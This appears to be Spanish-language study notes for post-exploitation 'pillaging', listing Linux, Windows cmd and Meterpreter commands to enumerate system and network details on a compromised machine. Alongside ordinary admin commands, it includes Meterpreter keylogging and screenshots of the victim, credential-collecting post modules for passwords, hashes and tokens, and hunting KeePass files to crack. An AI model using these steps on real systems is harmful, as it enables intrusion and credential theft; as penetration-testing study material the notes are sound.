El proceso de Pillaging es el de enumerar información relevante de la máquina explotada, tanto del sistema como de la red.


- Enumerar info del sistema en el objetivo:


**-Linux:**

uname -a ([kernel, OS, hostname, procesador](https://computernewage.com/2013/04/21/como-obtener-informacion-del-sistema-desde-la-terminal-de-linux/#sistema))

cat /etc/issue (distro + versión)

cat /etc/*release (distro + versión, codename en paréntesis)

env (para ver variables de entorno)

lscpu (info. CPU)

free -h (consumo RAM)

df -h (lista de discos duros y unidades montadas)

df -ht ext4 (sólo lista las unidades de formato ext4)

lsblk | grep sd (lista discos y filtra por anotación “sd”)

dpkg -l (lista de paquetes instalados en debian y sus versiones)


**-Meterpreter:**

getuid (para ver el usuario)

sysinfo (hostname, O.S. y Service Pack, arquitectura, idioma sistema y dominio ó hostname, distro + release version, kernel y arch)

C:\\Windows\system32\eula.txt (info OS, nº build, service pack)

show_mount (para mostrar todas las unidades activas)

screenshot para hacer captura de pantalla de la víctima (posiblemente revele información útil)

Keyloggear: keyscan_start -> keyscan_dump -> keyscan_stop

```
run post/windows/gather/TABULADOR #vemos todos los módulos post de enum que existen
run post/windows/gather/enum_appications #PARA VER LOS PROGRAMAS INSTALADOS Y SUS VERSIONES (si alguna es vulnerable podríamos atacarla)
run post/windows/gather/credentials/winscp #para encontrar contraaseñas de servicios
run post/windows/gather/credentials/credential_collector #para sacar usuarios, hashes y tokens disponibles.
```

Si la máquina víctima tiene un keepass instalado:

```
search -f *.kdb -r -d .
Si encontramos algo podríamos descargarlo y hacer un keepass2john o johntheripper directamente
```

**-Windows cmd:**

hostname (nombre del PC)

systeminfo (hostname, OS name, OS version, OS manufacturer, OS config, processor, Win directory, system directory, boot device, idiomas teclado y sistema, total physical memory (RAM), domain, logon server y hotfixes/actualizaciones, network card, hyper-v)

wmic qfe get Caption,Description,HotFixID,InstalledOn (info. adicional sobre los hotfixes/actualizaciones. Importante los security updates en cuanto a escalada de privilegios)


**Enumerar información de la red desde archivos en el objetivo:**

  

*Meterpreter:*

ifconfig (dirección IP + interfaces + MAC + IPv4 + Máscara)

netstat (listado servicios TCP/UDP activos y sus puertos + otros PCs en la red)

route (tabla de ruteo, gateway importante para pivoting)

arp (hosts conectados a la red)

route (ruteos de la red en IPv4)

  
*Linux:

ifconfig (tarjetas de red, MAC + IP + segmento)

ip a s (MAC, IP + segmento)

cat /etc/networks (interfaces y su configuración)

cat /etc/hosts (hosts + dominios locales)

cat /etc/resolv.conf (servidor DNS por defecto)

arp -a (hosts conectados a la red)

  
*Windows cmd:

ipconfig (adaptadores de red, sufijo DNS, direcciones IPv4 y 6, netmask y puerta de enlace)

ipconfig /all (hostname, IP routing enabled, MAC Address, DHCP enabled [IPs dinámicas], Lease expires, DHCPserver-gateway, DNS Server)

route print (routing table)

arp -a (todos los dispositivos en la red, IP y MAC)

netstat -ano (protocolos y puertos de los servicios [los 0.0.0.0 son del host])

netsh firewall show state (estado del firewall)

netsh advfirewall firewall dump (dumpea config file de firewall)

netsh advfirewall show allprofiles (si el firewall está activo o no)

wmic service get caption,started (para ver los servicios existentes)

wmic service where started=true get caption (para ver los servicios encendidos)

net view /domain (para ver info del dominio)

